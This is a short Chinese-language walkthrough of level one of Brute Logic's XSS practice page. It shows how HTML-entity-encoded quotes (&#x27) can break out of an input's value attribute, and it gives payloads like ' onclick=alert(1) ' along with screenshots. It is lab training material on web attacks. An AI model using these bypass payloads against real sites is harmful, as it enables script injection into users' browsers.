xss靶场：[XSS Test Page by Brute Logic](http://brutelogic.com.br/xss.php)
第一关，无任何过滤‘，但是没过滤html实体编码。输入html实体编码会自动解码

这里给出一个绕过’被过滤的技巧，使用条件是html实体编码没被过滤
html实体编码：&#x27 == ‘
比如:
```
代码显示地方：<input type="text" value=‘显示’>
<input type="text" value="&#x27 onclick=alert(1)'> #被过滤成html编码
如果html编码没被过滤，payload如下：&#x27 onclick=alert(1) &#x27
```

第一个payload：

' onclick=alert(1) '

![kfbZWj.md.png](https://s2.ax1x.com/2019/02/23/kfbZWj.md.png)

![kfb1TU.png](https://s2.ax1x.com/2019/02/23/kfb1TU.png)